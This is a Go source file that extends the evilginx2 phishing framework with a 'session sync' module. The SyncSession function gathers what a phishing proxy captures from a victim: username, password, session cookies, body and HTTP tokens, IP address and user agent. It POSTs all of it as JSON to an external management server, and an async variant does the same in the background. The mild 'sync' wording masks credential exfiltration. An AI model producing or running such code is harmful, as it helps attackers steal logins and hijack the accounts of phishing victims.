package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type SessionSync struct {
	platformURL string
	instanceAPI string
	httpClient  *http.Client
}

func NewSessionSync(platformURL, instanceAPIKey string) *SessionSync {
	return &SessionSync{
		platformURL: platformURL,
		instanceAPI: instanceAPIKey,
		httpClient: &http.Client{
			Timeout: 10 * time.Second,
		},
	}
}

// SyncSession syncs a captured session to the management platform
func (ss *SessionSync) SyncSession(session *database.Session) error {
	if ss.platformURL == "" || ss.instanceAPI == "" {
		// Platform not configured, skip sync
		return nil
	}

	// Prepare session data for sync
	syncData := map[string]interface{}{
		"instanceApiKey": ss.instanceAPI,
		"session": map[string]interface{}{
			"session_id":  session.SessionId,
			"phishlet":    session.Phishlet,
			"username":    session.Username,
			"password":    session.Password,
			"landing_url": session.LandingURL,
			"user_agent":  session.UserAgent,
			"remote_addr": session.RemoteAddr,
			"cookies":     session.CookieTokens,
			"tokens": map[string]interface{}{
				"body": session.BodyTokens,
				"http": session.HttpTokens,
			},
			"custom": session.Custom,
		},
	}

	jsonData, err := json.Marshal(syncData)
	if err != nil {
		return fmt.Errorf("failed to marshal session data: %v", err)
	}

	// Send to management platform
	url := fmt.Sprintf("%s/api/sessions/sync", ss.platformURL)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to create sync request: %v", err)
	}

	req.Header.Set("Content-Type", "application/json")

	resp, err := ss.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("failed to sync session: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("sync failed with status: %d", resp.StatusCode)
	}

	log.Debug("session sync: successfully synced session %s to management platform", session.SessionId)
	return nil
}

// SyncSessionAsync syncs a session in the background (non-blocking)
func (ss *SessionSync) SyncSessionAsync(session *database.Session) {
	go func() {
		if err := ss.SyncSession(session); err != nil {
			log.Warning("session sync: %v", err)
		}
	}()
}

